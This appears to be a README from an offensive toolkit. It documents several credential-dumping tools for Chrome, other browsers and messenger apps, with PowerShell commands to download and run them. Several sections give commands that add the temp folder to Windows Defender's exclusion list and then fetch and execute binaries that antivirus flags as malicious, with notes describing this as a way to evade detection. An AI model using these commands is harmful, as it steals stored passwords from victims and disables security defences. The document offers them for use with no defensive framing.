## DumpChromePasswords.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
```
<br />

**prerequisites:**
``` 
   1. You must have the System.Data.SQLite.dll handy (see below)
   2. Your database must be accessible (close Chrome, or make some copy)
   3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
```

<br />

**execute:**
```powershell
.\DumpChromePasswords.ps1
```

<br />


## HarvestBrowserPasswords.exe

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
```

<br />

**execute:**
```powershell
.\HarvestBrowserPasswords.exe -a, --all
.\HarvestBrowserPasswords.exe -f, --firefox
.\HarvestBrowserPasswords.exe -c, --chrome
```

<br />

## ChromePass.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|ChromePass|dumps usernames, passwords from chrome|Administrator|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV\Download PE\Exec PE|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
```

<br />

**prerequesites checks:**
```powershell
#Make sure Windows Defender service its running
[bool](Get-Service -Name "WinDefend")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Make sure required modules are present\loaded
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
```

<br />

**execute:**
```powershell
#Get Exclusions List
.\Invoke-Exclusions.ps1 -action "query"

## Add exclusion Path + Download URI PE + Execute PE
# 1º - Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
# 3º - cd $Env:TMP; .\ChromePass.exe /stext credentials.log
.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"

#Remove ExclusionPath "$Env:TMP" from Windows Defender list
.\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
```

<br />

**Final Notes**
```
ChromePass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute ChromePass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## WebBrowserPassView.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|WebBrowserPassView|dumps usernames, passwords from major browsers|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[WebBrowserPassView - nirsoft](https://www.nirsoft.net/utils/web_browser_password.html)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"
```

<br />

**execute:**
```powershell
.\WebBrowserPassView.exe
```

<br />

**Final Notes**
```
WebBrowserPassView.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute WebBrowserPassView.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (WebBrowserPassView.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or WebBrowserPassView.exe (deliver by -Uri parameter) at the end of execution.
```

<br />

## mspass.exe.exe
   
|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|mspass.exe|dumps usernames, passwords of messeger applications|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[mspass - nirsoft](https://www.nirsoft.net/utils/mspass.html)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "mspass.exe"
```

<br />

**execute:**
```powershell
.\mspass.exe
```

<br />

**Final Notes**
```
mspass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute mspass.exe from that location.

Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (mspass.exe).
Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -Uri parameter) at the end of execution.
```
